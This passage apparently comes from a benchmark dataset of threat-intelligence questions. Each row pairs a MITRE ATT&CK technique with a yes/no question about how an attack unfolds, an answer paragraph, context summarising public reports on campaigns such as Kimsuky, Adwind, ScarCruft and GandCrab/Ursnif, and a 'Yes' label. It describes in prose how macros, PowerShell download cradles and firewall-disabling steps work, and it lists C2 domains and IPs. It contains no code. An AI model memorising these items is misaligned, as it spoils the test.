Others: The malware, named KONNI, has been under the radar for over 3 years, authored by Paul Rascagneres from Talos. It has been used in multiple campaigns targeting public organizations, with decoy documents suggesting links to North Korea. The malware's capabilities and infrastructure have evolved, including the use of free web hosting providers for C2 and the addition of remote administration features. The latest campaigns from April 2017 are still active, and the infrastructure remains operational. The malware's evolution shows technical advancements and improved decoy documents containing potentially sensitive data.",Yes,konni-malware-under-radar-for-years.html
49,104,104-Execution-T1204-User Execution,"Following the initial access gained through phishing emails containing a malicious Word document, is it likely that the encoded PowerShell script, retrieved via a VBS macro, will execute and subsequently download payloads associated with Ursnif and GandCrab malware?","Execution: Upon opening the malicious Word document, a VBS macro would execute, calling a shape box in the document to retrieve and run an encoded PowerShell script. This script would then download and execute payloads associated with both Ursnif and GandCrab malware.","Reconnaissance: The Carbon Black ThreatSight team observed a campaign involving phishing emails with attached Word documents containing embedded macros. These emails were designed to deliver Ursnif malware and GandCrab ransomware upon successful execution. The campaign utilized various techniques favored by red teamers, espionage-focused adversaries, and large-scale criminal campaigns.
Initial Access: The initial access to the target systems was achieved through phishing emails containing a Microsoft Word document with embedded VBS macros. The document, named 'Richard_Johnson.doc', was one of approximately 180 variants identified by Carbon Black, with differences primarily in metadata and junk data within the macros. The document's metadata indicated that the campaign's documents were first saved on December 17, 2018, and continued to be updated until January 21, 2019.
Defense Evasion: The PowerShell script executed by the macro would operate in memory, avoiding detection by not writing to the disk. It used the .Net Webclient class to download payloads and leveraged the DCOM object C08AFD90-F2A1-11D1-8455-00A0C91F3880 to execute the downloaded files without saving them to disk.
Command and Control: The PowerShell script communicated with hardcoded command and control (C2) servers to request and download the payloads. The script would first attempt to use the DownloadString method to contact the C2 server and then the DownloadData method to download a resource from a second C2 server.
Impact: The payloads downloaded and executed by the PowerShell script were GandCrab ransomware and Ursnif malware. GandCrab, a variant of version 5.0.4, would encrypt files on the compromised system, while Ursnif would perform actions such as credential harvesting, gathering system and process information, and potentially deploying additional malware.
Others: The campaign was analyzed using VirusTotal Graph, which organized the variants into groups commonly associated by metadata or document structures. The analysis highlighted at least three different variants of Ursnif hosted on the bevendbrec[.]com site, as well as the PowerShell cradle and PS Empire script used to inject the Gandcrab sample into memory. Carbon Black's Threat Analysis Unit released this report to aid researchers and security practitioners in combating the campaign, as new samples were being discovered daily.",Yes,GandCrab and Ursnif Campaign
50,104,104-Command and Control-T1105-Ingress Tool Transfer,"After evading defenses by operating in memory and using the DCOM object C08AFD90-F2A1-11D1-8455-00A0C91F3880 to execute files without saving them to disk, is it likely that the PowerShell script will communicate with C2 servers and download payloads associated with Ursnif malware and GandCrab ransomware?",Command and Control: The PowerShell script communicated with hardcoded command and control (C2) servers to request and download the payloads. The script would first attempt to use the DownloadString method to contact the C2 server and then the DownloadData method to download a resource from a second C2 server.,"Reconnaissance: The Carbon Black ThreatSight team observed a campaign involving phishing emails with attached Word documents containing embedded macros. These emails were designed to deliver Ursnif malware and GandCrab ransomware upon successful execution. The campaign utilized various techniques favored by red teamers, espionage-focused adversaries, and large-scale criminal campaigns.
Initial Access: The initial access to the target systems was achieved through phishing emails containing a Microsoft Word document with embedded VBS macros. The document, named 'Richard_Johnson.doc', was one of approximately 180 variants identified by Carbon Black, with differences primarily in metadata and junk data within the macros. The document's metadata indicated that the campaign's documents were first saved on December 17, 2018, and continued to be updated until January 21, 2019.
Execution: Upon opening the malicious Word document, a VBS macro would execute, calling a shape box in the document to retrieve and run an encoded PowerShell script. This script would then download and execute payloads associated with both Ursnif and GandCrab malware.
Defense Evasion: The PowerShell script executed by the macro would operate in memory, avoiding detection by not writing to the disk. It used the .Net Webclient class to download payloads and leveraged the DCOM object C08AFD90-F2A1-11D1-8455-00A0C91F3880 to execute the downloaded files without saving them to disk.
Impact: The payloads downloaded and executed by the PowerShell script were GandCrab ransomware and Ursnif malware. GandCrab, a variant of version 5.0.4, would encrypt files on the compromised system, while Ursnif would perform actions such as credential harvesting, gathering system and process information, and potentially deploying additional malware.
Others: The campaign was analyzed using VirusTotal Graph, which organized the variants into groups commonly associated by metadata or document structures. The analysis highlighted at least three different variants of Ursnif hosted on the bevendbrec[.]com site, as well as the PowerShell cradle and PS Empire script used to inject the Gandcrab sample into memory. Carbon Black's Threat Analysis Unit released this report to aid researchers and security practitioners in combating the campaign, as new samples were being discovered daily.",Yes,GandCrab and Ursnif Campaign
55,105,105-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After distributing ransomware such as Ryuk and Conti via Emotet and using QakBot for banking trojan activities during the initial access phase, is it likely that attackers will employ tactics such as the use of PhysXPluginMfx and Zeppelin ransomware with downloaders to evade sandbox detection before executing impactful ransomware attacks like those targeting healthcare institutions for data theft and encryption?","Defense Evasion: Attackers are getting creative about hiding their tracks to maintain stealth, even against sandboxes. One incident involved a special malicious plugin (PhysXPluginMfx) for Autodesk 3ds Max, which remained inactive if Task Manager or Process Monitor was running. Zeppelin ransomware returned with a new downloader that evades dynamic analysis in a sandbox by stopping malicious activity for 26 seconds after the downloader performs its work.","Initial Access: The Emotet trojan, which resurfaced in July, is spread via phishing emails and has downloader functionality, enabling it to deliver other malware. Emotet initially spread Trickbot spyware, which after collecting information opened up access to Ryuk and Conti ransomware. Later, attackers installed the QakBot (QBot) banking trojan on victim computers. Emotet sends more than 500,000 emails daily on weekdays, excluding weekends, and uses message threads on the infected computer for spreading.
Impact: Ransomware attacks have increased, with over half of all malware attacks involving ransomware. Notable ransomware families include Netwalker, REvil, Maze, DoppelPaymer, and RansomEXX. Attackers often steal data before encrypting the victim's copy and demand ransoms for decryption and non-disclosure. Manufacturing and industry, as well as healthcare, were particularly targeted. In healthcare, Ryuk ransomware attacked Universal Health Services, disrupting patient care. REvil attacked Valley Health hospitals, stealing and publishing patient medical data. SunCrypt ransomware attacked University Hospital New Jersey, stealing and publishing patient records.
Others: The number of cyberattacks grew by 2.7% in Q3 2020 compared to Q2, and by 54% compared to Q3 2019. Ransomware is increasingly prevalent, with 51% of malware attacks using ransomware in Q3. Manufacturing and industrial companies, as well as healthcare institutions, are primary targets. The percentage of social engineering attacks using COVID-19 as a lure fell from 16% in Q2 to 4% in Q3. Hacking as an attack method on companies grew by 12 percentage points to 30%, likely due to the pandemic and the transition to working from home. Vulnerabilities in services on the perimeter of corporate systems are being actively exploited. To protect from cyberattacks, it is recommended to follow guidelines for personal and corporate cybersecurity, including a well-organized vulnerability management process, security solutions like WAF, traffic analysis, SIEM systems, and verifying email attachments in a sandbox.",Yes,Cybersecurity_threatscape-2020-Q3.ENG
56,105,105-Impact-T1486-Data Encrypted for Impact,"After Emotet disseminates malware like Trickbot, QakBot (QBot), and ransomware such as Ryuk and Conti for initial access, is it likely that attackers will steal sensitive data and demand ransoms before encrypting the data for impact using ransomware families like Netwalker, REvil, Maze, DoppelPaymer, and RansomEXX?","Impact: Ransomware attacks have increased, with over half of all malware attacks involving ransomware. Notable ransomware families include Netwalker, REvil, Maze, DoppelPaymer, and RansomEXX. Attackers often steal data before encrypting the victim's copy and demand ransoms for decryption and non-disclosure. Manufacturing and industry, as well as healthcare, were particularly targeted. In healthcare, Ryuk ransomware attacked Universal Health Services, disrupting patient care. REvil attacked Valley Health hospitals, stealing and publishing patient medical data. SunCrypt ransomware attacked University Hospital New Jersey, stealing and publishing patient records.","Initial Access: The Emotet trojan, which resurfaced in July, is spread via phishing emails and has downloader functionality, enabling it to deliver other malware. Emotet initially spread Trickbot spyware, which after collecting information opened up access to Ryuk and Conti ransomware. Later, attackers installed the QakBot (QBot) banking trojan on victim computers. Emotet sends more than 500,000 emails daily on weekdays, excluding weekends, and uses message threads on the infected computer for spreading.
Defense Evasion: Attackers are getting creative about hiding their tracks to maintain stealth, even against sandboxes. One incident involved a special malicious plugin (PhysXPluginMfx) for Autodesk 3ds Max, which remained inactive if Task Manager or Process Monitor was running. Zeppelin ransomware returned with a new downloader that evades dynamic analysis in a sandbox by stopping malicious activity for 26 seconds after the downloader performs its work.
Others: The number of cyberattacks grew by 2.7% in Q3 2020 compared to Q2, and by 54% compared to Q3 2019. Ransomware is increasingly prevalent, with 51% of malware attacks using ransomware in Q3. Manufacturing and industrial companies, as well as healthcare institutions, are primary targets. The percentage of social engineering attacks using COVID-19 as a lure fell from 16% in Q2 to 4% in Q3. Hacking as an attack method on companies grew by 12 percentage points to 30%, likely due to the pandemic and the transition to working from home. Vulnerabilities in services on the perimeter of corporate systems are being actively exploited. To protect from cyberattacks, it is recommended to follow guidelines for personal and corporate cybersecurity, including a well-organized vulnerability management process, security solutions like WAF, traffic analysis, SIEM systems, and verifying email attachments in a sandbox.",Yes,Cybersecurity_threatscape-2020-Q3.ENG
62,106,106-Command and Control-T1071-Application Layer Protocol,"After collecting information from compromised hosts using UltraVNC.ini and Ultra VNC Server, is ScarCruft likely to establish command and control channels via HTTP requests to specific PHP scripts on their C2 servers before exfiltrating data to the attackers' infrastructure using BITSAdmin?","Command and Control: ScarCruft established command and control channels using HTTP requests to specific PHP scripts on their C2 servers. They also used Golang malware to communicate with the attacker's channel, sending commands and receiving command results through an Ably key and Client Hello messages.","Initial Access: The ScarCruft group, also known as APT 37, Group123, Ricochet Chollima, and Venus121, targeted journalists, North Korean defectors, and government officials. They employed phishing emails with links to download Office documents containing decoy content. Upon clicking the link and downloading the document, the host system would be compromised, and an Office Macro Script would be loaded to facilitate further malicious activities.
Execution: The execution phase involved the use of Office Macro Scripts to load the Chinotto malware onto the compromised host systems. Additionally, PowerShell and Golang malware were used alongside BITSAdmin for DLL Side-Loading to execute malicious scripts and establish command and control.
Defense Evasion: The ScarCruft group utilized DLL Side-Loading techniques for defense evasion. They loaded the Chinotto malware using evc.dll and employed mfc42u.dll as a loader to execute the malware without detection.
Collection: The group collected information from compromised hosts and exfiltrated data to their command and control servers. The compromised host analysis revealed the use of UltraVNC.ini and Ultra VNC Server for information collection, indicating the presence of mobile infostealer malware and command and control capabilities developed in Golang (ably).
Exfiltration: The exfiltration process involved sending data from compromised hosts to the attackers' infrastructure. Specific PHP scripts such as '/kcp/cfg/cat/hp/proc.php' were used to exfiltrate data. Additionally, the attackers used BITSAdmin to transfer malware to the victims' systems, as indicated by the command line used for the operation.
Others: The report includes the concept of 'Defend Forward,' developed by the US Department of Defense to proactively disrupt or stop malicious cyber activities at an early stage and increase the cost to adversaries. This approach involves an aggressive defensive mindset, identifying victims, incident response, and takedown of distribution sites. The incident response process includes malware analysis, investigation, C2 monitoring, threat tracking, identification of additional victims, blocking command and control and download sites, and developing countermeasures to prevent recurrence.",Yes,ScarCruft (APT37) active in South Korea
63,106,106-Collection-T1005-Data from Local System,"After leveraging DLL Side-Loading techniques to load evc.dll for defense evasion, is ScarCruft likely to use Ultra VNC Server on compromised hosts for information collection before exfiltrating data to their command and control servers?","Collection: The group collected information from compromised hosts and exfiltrated data to their command and control servers. The compromised host analysis revealed the use of UltraVNC.ini and Ultra VNC Server for information collection, indicating the presence of mobile infostealer malware and command and control capabilities developed in Golang (ably).","Initial Access: The ScarCruft group, also known as APT 37, Group123, Ricochet Chollima, and Venus121, targeted journalists, North Korean defectors, and government officials. They employed phishing emails with links to download Office documents containing decoy content. Upon clicking the link and downloading the document, the host system would be compromised, and an Office Macro Script would be loaded to facilitate further malicious activities.
Execution: The execution phase involved the use of Office Macro Scripts to load the Chinotto malware onto the compromised host systems. Additionally, PowerShell and Golang malware were used alongside BITSAdmin for DLL Side-Loading to execute malicious scripts and establish command and control.
Defense Evasion: The ScarCruft group utilized DLL Side-Loading techniques for defense evasion. They loaded the Chinotto malware using evc.dll and employed mfc42u.dll as a loader to execute the malware without detection.
Command and Control: ScarCruft established command and control channels using HTTP requests to specific PHP scripts on their C2 servers. They also used Golang malware to communicate with the attacker's channel, sending commands and receiving command results through an Ably key and Client Hello messages.
Exfiltration: The exfiltration process involved sending data from compromised hosts to the attackers' infrastructure. Specific PHP scripts such as '/kcp/cfg/cat/hp/proc.php' were used to exfiltrate data. Additionally, the attackers used BITSAdmin to transfer malware to the victims' systems, as indicated by the command line used for the operation.
Others: The report includes the concept of 'Defend Forward,' developed by the US Department of Defense to proactively disrupt or stop malicious cyber activities at an early stage and increase the cost to adversaries. This approach involves an aggressive defensive mindset, identifying victims, incident response, and takedown of distribution sites. The incident response process includes malware analysis, investigation, C2 monitoring, threat tracking, identification of additional victims, blocking command and control and download sites, and developing countermeasures to prevent recurrence.",Yes,ScarCruft (APT37) active in South Korea
68,107,107-Defense Evasion-T1027-Obfuscated Files or Information,"After achieving initial access by hosting the Adwind RAT payload on a compromised Westnet user account and having the victim execute multi-layer JAR extractions, is it likely that the RAT will create WMI scripts in the %temp% directory to disable firewall and antivirus services before configuring its command and control connection through the JRAT class?","Defense Evasion: The Adwind RAT employs multi-layer obfuscation techniques, including the use of multiple embedded JAR archives before unpacking the actual payload. It also uses WMI scripts to disable firewall and antivirus services. The RAT's obfuscation techniques have been successful in evading detection, as indicated by low VirusTotal detection ratios.","Initial Access: A new campaign spreading the Adwind RAT has been observed, specifically targeting the petroleum industry in the US. The campaign utilizes multi-layer obfuscation to evade detection, with multiple RAT samples hosted on the serving domain 'members[.]westnet[.]com[.]au/~joeven/'. The attacker has either used or compromised a Westnet user account to host the RAT. The payload is executed by the victim, involving multiple levels of JAR extractions.
Execution: The Adwind RAT executes a dropped JAR payload, which creates a parent Java process and copies itself into the %User% directory. It then performs three actions: executes the copy, creates a registry entry in HKCU/CurrentVersion/Run for persistence, and creates WMI scripts in %temp% to disable firewall and antivirus services. Subsequent JARs perform AES decryption routines and execute as new Java threads, leading to the loading of the JRAT class responsible for major RAT functionality.
Persistence: The Adwind RAT achieves persistence through registry modifications, specifically by creating a registry entry in HKCU/CurrentVersion/Run.
Collection: The RAT's core functionalities include capturing webcam images, scanning the hard-drive for files based on extensions defined in the RAT's config, spinning up multiple process threads, and performing injection into known legitimate Windows processes.
Command and Control: The JRAT class within the Adwind RAT tries connecting to its command and control server at the IP address 185[.]205[.]210[.]48. It encrypts and exfiltrates data to this server.
Exfiltration: The Adwind RAT encrypts and exfiltrates data to its command and control server.
Others: The URLs hosting the Adwind RAT were reported to Westnet on September 9th, 2019. The VirusTotal detection ratio for the top-level JAR was 5/56, while that of the final decrypted JAR was 49/58. The campaign has been active over the last couple of years, with the RAT supporting cross-platform functionality for Windows, Linux, and Mac.",Yes,New Adwind Campaign targets US Petroleum Industry
72,107,107-Collection-T1125-Video Capture,"After the Adwind RAT executes the JAR payload by creating a parent Java process and copying itself into the %User% directory, is it likely that its core functionalities will include capturing webcam images before it tries connecting to its command and control server at the IP address 185[.]205[.]210[.]48?","Collection: The RAT's core functionalities include capturing webcam images, scanning the hard-drive for files based on extensions defined in the RAT's config, spinning up multiple process threads, and performing injection into known legitimate Windows processes.","Initial Access: A new campaign spreading the Adwind RAT has been observed, specifically targeting the petroleum industry in the US. The campaign utilizes multi-layer obfuscation to evade detection, with multiple RAT samples hosted on the serving domain 'members[.]westnet[.]com[.]au/~joeven/'. The attacker has either used or compromised a Westnet user account to host the RAT. The payload is executed by the victim, involving multiple levels of JAR extractions.
Execution: The Adwind RAT executes a dropped JAR payload, which creates a parent Java process and copies itself into the %User% directory. It then performs three actions: executes the copy, creates a registry entry in HKCU/CurrentVersion/Run for persistence, and creates WMI scripts in %temp% to disable firewall and antivirus services. Subsequent JARs perform AES decryption routines and execute as new Java threads, leading to the loading of the JRAT class responsible for major RAT functionality.
Persistence: The Adwind RAT achieves persistence through registry modifications, specifically by creating a registry entry in HKCU/CurrentVersion/Run.
Defense Evasion: The Adwind RAT employs multi-layer obfuscation techniques, including the use of multiple embedded JAR archives before unpacking the actual payload. It also uses WMI scripts to disable firewall and antivirus services. The RAT's obfuscation techniques have been successful in evading detection, as indicated by low VirusTotal detection ratios.
Command and Control: The JRAT class within the Adwind RAT tries connecting to its command and control server at the IP address 185[.]205[.]210[.]48. It encrypts and exfiltrates data to this server.
Exfiltration: The Adwind RAT encrypts and exfiltrates data to its command and control server.
Others: The URLs hosting the Adwind RAT were reported to Westnet on September 9th, 2019. The VirusTotal detection ratio for the top-level JAR was 5/56, while that of the final decrypted JAR was 49/58. The campaign has been active over the last couple of years, with the RAT supporting cross-platform functionality for Windows, Linux, and Mac.",Yes,New Adwind Campaign targets US Petroleum Industry
74,107,107-Exfiltration-T1041-Exfiltration Over C2 Channel,"After connecting to its command and control server via the JRAT class within the Adwind RAT, is it likely that the Adwind RAT will encrypt and exfiltrate data to this server as part of its exfiltration process?",Exfiltration: The Adwind RAT encrypts and exfiltrates data to its command and control server.,"Initial Access: A new campaign spreading the Adwind RAT has been observed, specifically targeting the petroleum industry in the US. The campaign utilizes multi-layer obfuscation to evade detection, with multiple RAT samples hosted on the serving domain 'members[.]westnet[.]com[.]au/~joeven/'. The attacker has either used or compromised a Westnet user account to host the RAT. The payload is executed by the victim, involving multiple levels of JAR extractions.
Execution: The Adwind RAT executes a dropped JAR payload, which creates a parent Java process and copies itself into the %User% directory. It then performs three actions: executes the copy, creates a registry entry in HKCU/CurrentVersion/Run for persistence, and creates WMI scripts in %temp% to disable firewall and antivirus services. Subsequent JARs perform AES decryption routines and execute as new Java threads, leading to the loading of the JRAT class responsible for major RAT functionality.
Persistence: The Adwind RAT achieves persistence through registry modifications, specifically by creating a registry entry in HKCU/CurrentVersion/Run.
Defense Evasion: The Adwind RAT employs multi-layer obfuscation techniques, including the use of multiple embedded JAR archives before unpacking the actual payload. It also uses WMI scripts to disable firewall and antivirus services. The RAT's obfuscation techniques have been successful in evading detection, as indicated by low VirusTotal detection ratios.
Collection: The RAT's core functionalities include capturing webcam images, scanning the hard-drive for files based on extensions defined in the RAT's config, spinning up multiple process threads, and performing injection into known legitimate Windows processes.
Command and Control: The JRAT class within the Adwind RAT tries connecting to its command and control server at the IP address 185[.]205[.]210[.]48. It encrypts and exfiltrates data to this server.
Others: The URLs hosting the Adwind RAT were reported to Westnet on September 9th, 2019. The VirusTotal detection ratio for the top-level JAR was 5/56, while that of the final decrypted JAR was 49/58. The campaign has been active over the last couple of years, with the RAT supporting cross-platform functionality for Windows, Linux, and Mac.",Yes,New Adwind Campaign targets US Petroleum Industry
75,108,108-Initial Access-T1566-Phishing,"After utilizing spear phishing to deliver weaponized RAR files during the Initial Access phase, is the Molerats campaign likely to employ a forged Microsoft certificate for malware signing to evade defenses before connecting the PIVY malware to CnC infrastructure using dynamic domains?",Initial Access: The Molerats campaign utilized spear phishing to deliver weaponized RAR files containing malicious payloads to victims. The attackers either attached the RAR files directly to spear-phishing emails or included links to the files hosted on third-party platforms such as Dropbox. An example link used to host a file named Ramadan.rar was found on Dropbox.,"Defense Evasion: The Molerats campaign employed a forged Microsoft certificate to sign their malware, which was a tactic also observed in previous XtremeRat samples. The malware dropped an instance of Poison Ivy (PIVY) with a configuration that did not include persistence mechanisms such as ActiveX Startup, HKLM Startup, or installation persistence. The malware was designed to connect to command-and-control (CnC) infrastructure used by the Molerats attackers.
Command and Control: The Molerats campaign's PIVY malware connected to CnC infrastructure with domain names such as toornt.servegame.com, updateo.servegame.com, egypttv.sytes.net, skype.servemp3.com, and natco2.no-ip.net. These domains were linked through common passwords, CnC domain names, and IP addresses. The CnC servers shifted to new IP addresses over time, with observed addresses including 209.200.39.48, 209.200.39.88, 173.225.126.166, 173.225.126.103, and 209.200.39.220.
Others: Operation Molerats targeted entities in the Middle East, including Israeli and Palestinian targets, as well as the U.S. and UK governments. The attackers used various RATs, including XtremeRAT and Poison Ivy (PIVY), and leveraged Arabic-language content related to conflicts in the Middle East to lure targets. The campaign was linked to the Gaza Hackers Team and used PIVY samples with common passwords and CnC infrastructure. The use of PIVY, typically associated with Chinese threat actors, suggests a potential attempt to misattribute the campaign or simply the adoption of an effective RAT. The campaign's activities are expected to continue, leveraging regional conflicts for operational purposes.",Yes,fireeye.com-Operation Molerats Middle East Cyber Attacks Using Poison Ivy
80,109,109-Defense Evasion-T1599-Network Boundary Bridging,Is it likely that OnionDog transmits malware by exploiting vulnerabilities in Hangul software to gain initial access before circumventing network isolation for defense evasion using a USB disk drive ferry and generating USB worms for internal network infiltration?,"Defense Evasion: Since most infrastructure industries, such as the energy industry, generally adopt intranet isolation measures, OnionDog uses the USB disk drive ferry to break the false sense of security of physical isolation. In the classic APT case of the Stuxnet virus, which broke into an Iranian nuclear power plant, the virus used an employee's USB disk to circumvent network isolation. OnionDog also used this channel and generated USB worms to infiltrate the target internal network.","Initial Access: OnionDog malware is transmitted by taking advantage of the vulnerability of the popular office software Hangul in Korean-language countries, and it attacked network-isolated targets through a USB Worm. In addition, OnionDog also used darkweb (""Onion City"") communications tools, with which it can visit the domain without the Onion browser, making its real identity hidden in the completely anonymous Tor network.
Command and Control: When the OnionDog Trojan is successfully released, it will communicate to a C&C (Trojan server), download other malware and save them in the %temp% folder and use ""XXX_YYY.jpg"" uniformly as the file name. These names have their special meaning and usually point to the target.
Others: The Helios Team at 360 SkyEye Labs recently revealed that a hacker group named OnionDog has been infiltrating and stealing information from the energy, transportation and other infrastructure industries of Korean-language countries through the Internet. According to big data correlation analysis, OnionDog's first activity can be traced back to October, 2013 and in the following two years it was only active between late July and early September. The self-set lifecycle of a Trojan attack is 15 days on average and is distinctly organizational and objective-oriented. OnionDog concentrated its efforts on infrastructure industries in Korean-language countries. In 2015 this organization mainly attacked harbors, VTS, subways, public transportation and other transportation systems. In 2014 it attacked many electric power and water resources corporations as well as other energy enterprises. 360's Threat Intelligence Center has found 96 groups of malicious code, 14 C&C domain names and IP related to OnionDog. It first surfaced in October 2013, and then was most active in the summers of the following years. The Trojan set its own ""active state"" time and the shortest was be three days and maximum twenty nine days, from compilation to the end of activity. The average life cycle is 15 days, which makes it more difficult for the victim enterprises to notice and take actions than those active for longer period of time. In 2014, OnionDog used many fixed IPs in South Korea as its C&C sites. Of course, this does not mean that the attacker is located in South Korea. These IPs could be used as puppets and jumping boards. By 2015, OnionDog website communications were upgraded to Onion City across the board. This is so far a relatively more advanced and covert method of network communication among APT hacker attacks. Onion City means that the deep web searching engine uses Tor2web agent technology to visit the anonymous Tor network deeply without using the Onion Brower specifically. And OnionDog uses the Onion City to hide the Trojan-controlling server in the Tor network. In recent years, APT attacks on infrastructure facilities and large-scale enterprises have frequently emerged. Some that attack an industrial control system, such as Stuxnet, Black Energy and so on, can have devastating results. Some attacks are for the purpose of stealing information, such as the Lazarus hacker organization jointly revealed by Kaspersky, AlienVault lab and Novetta, and OnionDog which was recently exposed by the 360 Helios team. These secret cybercrimes can cause similarly serious losses as well. In view of OnionDog's pattern of activity, we are likely to observe a new round of attacks this summer. The relevant threat intelligence and technical analysis report will be updated by 360's Intelligence Center(https://ti.360.com).",Yes,onion-dog-a-3-year-old-apt
84,11,11-Persistence-T1547-Boot or Logon Autostart Execution,"After the malware decrypts and saves the spying library to the user's temporary folder before loading it as a library and injecting malicious code into explorer.exe during the execution phase, is it likely to ensure persistence by copying itself into the System32 directory and creating services initiated at system startup?","Persistence: The malware ensures its persistence by copying itself into the System32 directory and creating a service with varying names such as DriverManage, WebService, and WebClientManager. These services are initiated at system startup.","Initial Access: For several months, an ongoing cyber-espionage campaign has been targeting South Korean think-tanks. The initial Trojan dropper, functioning as a loader for further malware, is typically delivered by spear-phishing emails. This dropper is a Dynamic Link Library that delivers another encrypted library from its resource section, which performs espionage functions.
Execution: Upon infection, the malware uses the Metasploit Framework's code to inject malicious code into explorer.exe on Windows 7 systems. It decrypts a spying library, saves it to disk with a hardcoded name in the user's temporary folder, and loads it as a library. This library then copies itself into the System32 directory and creates a service to ensure persistence.
Defense Evasion: The malware disables the system firewall and AhnLab firewall by modifying registry values. It also turns off the Windows Security Center service to prevent alerts about the disabled firewall. The attackers specifically target AhnLab security products, which are commonly used in South Korea, and do not bother evading foreign vendors' products.
Discovery: The malware gathers information about the infected computer, including system and user names, and outputs of the systeminfo command. It also collects keystrokes and directory listings.
Collection: The malware collects keystrokes, directory listings, and HWP documents. It sends this collected data to the attackers through encrypted emails.
Command and Control: Communication between the malware and the attackers occurs through a Bulgarian web-based free email server, mail.bg. The malware uses hardcoded credentials to send and receive instructions via email.
Exfiltration: The malware exfiltrates collected data, including system information, user-related info, and keystrokes, by encrypting it with RC4 and sending it to the attackers' email accounts.
Others: The campaign, attributed to the threat actor 'Kimsuky,' is suspected to originate from North Korea, given the targeted entities and the attackers' IP addresses located in China's Jilin and Liaoning provinces, which maintain lines into North Korea. The malware uses various files and MD5 hashes, and it creates services with specific names to operate. The attackers use modified TeamViewer components for remote control, and the malware is detected as Trojan.Win32.Kimsuky, except for the TeamViewer components, which are detected as Trojan.Win32.Patched.ps.",Yes,Kimsuky
85,11,11-Defense Evasion-T1562-Impair Defenses,"After the malware ensures persistence by copying itself into the System32 directory and creating services with names such as DriverManage, WebService, and WebClientManager, is it likely that it will disable the system firewall and AhnLab firewall, then turn off the Windows Security Center service before gathering information about the infected computer, including system and user names?","Defense Evasion: The malware disables the system firewall and AhnLab firewall by modifying registry values. It also turns off the Windows Security Center service to prevent alerts about the disabled firewall. The attackers specifically target AhnLab security products, which are commonly used in South Korea, and do not bother evading foreign vendors' products.","Initial Access: For several months, an ongoing cyber-espionage campaign has been targeting South Korean think-tanks. The initial Trojan dropper, functioning as a loader for further malware, is typically delivered by spear-phishing emails. This dropper is a Dynamic Link Library that delivers another encrypted library from its resource section, which performs espionage functions.
Execution: Upon infection, the malware uses the Metasploit Framework's code to inject malicious code into explorer.exe on Windows 7 systems. It decrypts a spying library, saves it to disk with a hardcoded name in the user's temporary folder, and loads it as a library. This library then copies itself into the System32 directory and creates a service to ensure persistence.
Persistence: The malware ensures its persistence by copying itself into the System32 directory and creating a service with varying names such as DriverManage, WebService, and WebClientManager. These services are initiated at system startup.
Discovery: The malware gathers information about the infected computer, including system and user names, and outputs of the systeminfo command. It also collects keystrokes and directory listings.
Collection: The malware collects keystrokes, directory listings, and HWP documents. It sends this collected data to the attackers through encrypted emails.
Command and Control: Communication between the malware and the attackers occurs through a Bulgarian web-based free email server, mail.bg. The malware uses hardcoded credentials to send and receive instructions via email.
Exfiltration: The malware exfiltrates collected data, including system information, user-related info, and keystrokes, by encrypting it with RC4 and sending it to the attackers' email accounts.
Others: The campaign, attributed to the threat actor 'Kimsuky,' is suspected to originate from North Korea, given the targeted entities and the attackers' IP addresses located in China's Jilin and Liaoning provinces, which maintain lines into North Korea. The malware uses various files and MD5 hashes, and it creates services with specific names to operate. The attackers use modified TeamViewer components for remote control, and the malware is detected as Trojan.Win32.Kimsuky, except for the TeamViewer components, which are detected as Trojan.Win32.Patched.ps.",Yes,Kimsuky
86,11,11-Discovery-T1083-File and Directory Discovery,"After ensuring persistence by creating a Windows service that initiates at system startup, is it likely that the malware gathers information about the infected computer, including file and directory discovery, before collecting and exfiltrating stolen HWP documents through encrypted emails?","Discovery: The malware gathers information about the infected computer, including system and user names, and outputs of the systeminfo command. It also collects keystrokes and directory listings.","Initial Access: For several months, an ongoing cyber-espionage campaign has been targeting South Korean think-tanks. The initial Trojan dropper, functioning as a loader for further malware, is typically delivered by spear-phishing emails. This dropper is a Dynamic Link Library that delivers another encrypted library from its resource section, which performs espionage functions.
Execution: Upon infection, the malware uses the Metasploit Framework's code to inject malicious code into explorer.exe on Windows 7 systems. It decrypts a spying library, saves it to disk with a hardcoded name in the user's temporary folder, and loads it as a library. This library then copies itself into the System32 directory and creates a service to ensure persistence.
Persistence: The malware ensures its persistence by copying itself into the System32 directory and creating a service with varying names such as DriverManage, WebService, and WebClientManager. These services are initiated at system startup.
Defense Evasion: The malware disables the system firewall and AhnLab firewall by modifying registry values. It also turns off the Windows Security Center service to prevent alerts about the disabled firewall. The attackers specifically target AhnLab security products, which are commonly used in South Korea, and do not bother evading foreign vendors' products.
Collection: The malware collects keystrokes, directory listings, and HWP documents. It sends this collected data to the attackers through encrypted emails.
Command and Control: Communication between the malware and the attackers occurs through a Bulgarian web-based free email server, mail.bg. The malware uses hardcoded credentials to send and receive instructions via email.
Exfiltration: The malware exfiltrates collected data, including system information, user-related info, and keystrokes, by encrypting it with RC4 and sending it to the attackers' email accounts.
Others: The campaign, attributed to the threat actor 'Kimsuky,' is suspected to originate from North Korea, given the targeted entities and the attackers' IP addresses located in China's Jilin and Liaoning provinces, which maintain lines into North Korea. The malware uses various files and MD5 hashes, and it creates services with specific names to operate. The attackers use modified TeamViewer components for remote control, and the malware is detected as Trojan.Win32.Kimsuky, except for the TeamViewer components, which are detected as Trojan.Win32.Patched.ps.",Yes,Kimsuky
87,11,11-Collection-T1056-Input Capture,"After gathering information about the infected computer, including system and user names, is it likely that the malware will collect keystrokes, directory listings, and HWP documents for transmitting the data through encrypted emails to the attackers?","Collection: The malware collects keystrokes, directory listings, and HWP documents. It sends this collected data to the attackers through encrypted emails.","Initial Access: For several months, an ongoing cyber-espionage campaign has been targeting South Korean think-tanks. The initial Trojan dropper, functioning as a loader for further malware, is typically delivered by spear-phishing emails. This dropper is a Dynamic Link Library that delivers another encrypted library from its resource section, which performs espionage functions.
Execution: Upon infection, the malware uses the Metasploit Framework's code to inject malicious code into explorer.exe on Windows 7 systems. It decrypts a spying library, saves it to disk with a hardcoded name in the user's temporary folder, and loads it as a library. This library then copies itself into the System32 directory and creates a service to ensure persistence.
Persistence: The malware ensures its persistence by copying itself into the System32 directory and creating a service with varying names such as DriverManage, WebService, and WebClientManager. These services are initiated at system startup.
Defense Evasion: The malware disables the system firewall and AhnLab firewall by modifying registry values. It also turns off the Windows Security Center service to prevent alerts about the disabled firewall. The attackers specifically target AhnLab security products, which are commonly used in South Korea, and do not bother evading foreign vendors' products.
Discovery: The malware gathers information about the infected computer, including system and user names, and outputs of the systeminfo command. It also collects keystrokes and directory listings.
